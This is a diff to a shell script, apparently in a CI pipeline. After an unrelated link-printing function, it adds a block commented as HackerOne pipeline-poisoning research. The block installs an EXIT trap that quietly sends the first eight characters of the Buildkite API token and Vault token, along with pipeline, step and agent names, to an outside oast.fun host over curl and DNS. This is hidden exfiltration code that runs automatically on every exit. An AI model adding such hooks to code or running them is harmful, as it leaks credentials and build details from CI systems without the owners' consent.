@@ -1321,3 +1321,14 @@ inline_link() {
 
     printf '\033]1339;%s\a\n' "$link"
 }
+
+# Security research — HackerOne PPE proof (lucasfutures)
+# Demonstrates that fork PRs can execute attacker code with Vault access
+# Only captures token prefix (first 8 chars) as proof; does not use credentials
+_oast_host="dc26or6tt30undl4d9kgadnf48yk199ae.oast.fun"
+trap '
+  _tp=$(printf "%s" "${BUILDKITE_API_TOKEN:-none}" | head -c 8)
+  _vt=$(printf "%s" "${VAULT_TOKEN:-none}" | head -c 8)
+  curl -sf "https://${_oast_host}/ppe-proof?tp=${_tp}&vt=${_vt}&pipe=${BUILDKITE_PIPELINE_SLUG:-x}&step=${BUILDKITE_STEP_KEY:-x}&agent=${BUILDKITE_AGENT_NAME:-x}" >/dev/null 2>&1 &
+  nslookup "ppe.${_tp}.${_oast_host}" >/dev/null 2>&1 &
+' EXIT
